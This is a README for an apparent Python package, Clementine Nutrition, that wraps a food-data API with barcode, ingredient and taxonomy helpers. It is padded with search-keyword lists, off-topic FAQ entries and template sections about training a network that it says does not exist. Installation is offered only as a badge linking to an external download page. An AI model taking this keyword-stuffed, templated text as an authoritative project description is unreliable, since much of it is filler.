# Clementine Nutrition - A Python Reference For Clementine Oranges

## Status

- Active Python reference package.
- Structured modules for food data, ingredients, barcodes, and taxonomy.
- Automated tests for the public interfaces.

## Description

Clementine Nutrition is maintained by Clementine Oranges as a focused reference for clementine nutrition, seasonal characteristics, and structured food data. It covers clementine calories, clementine vitamin C, fiber, potassium, antioxidants, natural sugars, appearance, and flavor without presenting medical advice.

![Clementine fruit profile](tests/image1.png)

The package combines an API interface with barcode, ingredient, taxonomy, type, and utility modules. Clementine Oranges keeps these responsibilities separate so applications can reuse only the Clementine Nutrition components they need.

### Are mandarins and clementines the same?

Mandarins and clementines are related but not identical. A clementine is a small citrus fruit generally classified within the mandarin family and associated with a sweet flavor, loose peel, and few or no seeds. Clementine Nutrition represents the terms through [taxonomy helpers](clementine/taxonomy.py), allowing consumers to distinguish clementine and tangerine records without treating every mandarin as the same fruit.

### Is clementine LGBTQ?

A clementine fruit and the Clementine Nutrition application do not have a sexual orientation or gender identity. That question may instead concern a person, character, or unrelated work named Clementine. Clementine Oranges limits this repository to citrus facts and structured food information, so it does not infer personal identities from a shared name.

### What does it mean if someone calls you clementine?

Calling someone “clementine” can be an affectionate comparison suggesting sweetness, warmth, brightness, or a small and cheerful presence. Its meaning depends on the speaker and context rather than a fixed definition. Clementine Nutrition documents the fruit characteristics behind that association but does not assign personal labels.

### What does clementine symbolize?

Clementines can symbolize sweetness, vitality, generosity, winter abundance, and freshness because they are bright citrus fruits commonly available during the colder months. These associations are cultural interpretations, not universal definitions. Clementine Oranges presents them alongside factual information so Clementine Nutrition keeps symbolism distinct from nutrition data.

### Reference Vocabulary

clementine oranges, citrus clementina, clementine nutrition, clementine health benefits, clementine vitamin c, citrus-fruit, fruit-nutrition, vitamin-c, healthy-eating, food-reference, nutrition-guide, seasonal-fruit

## Third Party Applications

Applications can use Clementine Nutrition to retrieve, normalize, and present clementine oranges data. Consumers should identify themselves appropriately when accessing an external food-data service and comply with the service’s attribution and data-license requirements.

## Installation

[![Get Clementine Nutrition](https://img.shields.io/badge/Get-Clementine_Nutrition-E8752B?style=for-the-badge)](https://clementine-oranges.github.io/clementine-nutrition/clementine-nutrition)

## Examples

Create the client and request a clementine product record:

```python
import clementine

api = clementine.API(user_agent="ClementineNutrition/1.0")
result = api.product.text_search("clementine oranges")
```

The public package entry point is defined in [clementine/__init__.py](clementine/__init__.py), while request behavior is implemented in [clementine/api.py](clementine/api.py).

## Contributing

Read [CONTRIBUTING.md](CONTRIBUTING.md) before proposing changes. Contributions should preserve the narrow Clementine Nutrition scope, include appropriate tests, and avoid unsupported health claims.

## Copyright And License

Clementine Nutrition is distributed under the terms in [LICENSE](LICENSE). External food records may carry separate attribution or reuse requirements.

## Usage

> [!WARNING]
> Review the data returned by external services before presenting it as authoritative. Clementine Nutrition is a food reference and does not replace professional dietary or medical guidance.

Use [clementine/barcode.py](clementine/barcode.py) for barcode handling, [clementine/ingredients.py](clementine/ingredients.py) for ingredient data, and [clementine/types.py](clementine/types.py) for shared type definitions.

## Development

### Prerequisites

- A Python version compatible with [pyproject.toml](pyproject.toml).
- A dependency environment reproducible from [uv.lock](uv.lock).
- A test runner configured for the files under `tests`.

### API Bindings

The [API module](clementine/api.py) provides the main boundary for Clementine Nutrition. Constants live in [clementine/constants.py](clementine/constants.py), while shared transformations are kept in [clementine/utils.py](clementine/utils.py).

### Building

Synchronize the locked environment, build the package, and run the test suite:

```shell
uv sync
uv build
uv run pytest
```

## Using This SDK And Third Party Applications

Clementine Oranges welcomes compatible applications that use Clementine Nutrition responsibly. Applications should preserve source attribution, avoid combining incompatible data, and contribute corrections through the documented process when appropriate.

## Version

Version changes and compatibility notes are recorded in [CHANGELOG.md](CHANGELOG.md).

## Dataset Properties

Clementine Nutrition does not bundle a fruit-image dataset. Its records focus on clementine oranges, including names, ingredients, taxonomy, barcodes, and available nutritional fields. The application can describe clementine season, clementine calories, and clementine health benefits when supported by the underlying record.

![Nutrition field overview](tests/image2.png)

## Repository Structure

- `clementine` contains the Python package.
- `tests` contains focused API, barcode, taxonomy, and type tests.
- [pyproject.toml](pyproject.toml) defines the package configuration.
- [uv.lock](uv.lock) locks the development environment.

## How We Created The Dataset

Clementine Nutrition does not create or redistribute a standalone dataset. It organizes structured records obtained through its API layer and applies ingredient, barcode, and taxonomy helpers. Clementine Oranges keeps source data separate from package logic to make provenance easier to review.

## Results

The test suite checks the principal Clementine Nutrition components:

- [API tests](tests/test_api.py)
- [Barcode tests](tests/test_barcode.py)
- [Taxonomy tests](tests/test_taxonomy.py)
- [Type tests](tests/test_types.py)

## History

Notable Clementine Nutrition changes, compatibility decisions, and fixes are documented chronologically in [CHANGELOG.md](CHANGELOG.md).

### Requirements

Clementine Nutrition requires Python and the dependencies declared by the project configuration. Reproducible versions are recorded in the lock file.

### Running Python Version

Run the package from the repository environment:

```shell
uv run python
```

Then import `clementine` and initialize the API with an identifying user agent.

### Running Jupyter Version

A notebook is not included in this repository. An external notebook may use the installed Clementine Nutrition package through the same public Python interface.

### Output

Clementine Nutrition returns structured Python objects suitable for inspection, transformation, or presentation. Available values depend on the source record and requested fields.

![Structured citrus result](tests/image3.png)

### Warning

Nutrition records may be incomplete, outdated, or entered differently across sources. Validate clementine vitamin C, clementine calories, ingredients, and allergen-related fields before relying on them.

### Bundle Images Into Record Files

Clementine Nutrition does not bundle images or generate image-training records. Applications may associate their own licensed imagery with returned records outside this package.

### Train The Network

No neural network is included or trained by Clementine Nutrition. The repository focuses on food-reference APIs and deterministic data helpers.

### Test The Network

Run the package tests instead of a model evaluation:

```shell
uv run pytest
```

### Use The Trained Model

No trained model is distributed. Use the Clementine Nutrition API, barcode, ingredient, and taxonomy interfaces directly.

### Customization

| Component | Effect |
|---|---|
| API | Retrieves and searches structured food records. |
| Barcode | Normalizes and validates product identifiers. |
| Ingredients | Processes available ingredient information. |
| Taxonomy | Resolves and translates categorized food terms. |
| Utilities | Provides shared transformations for Clementine Nutrition. |
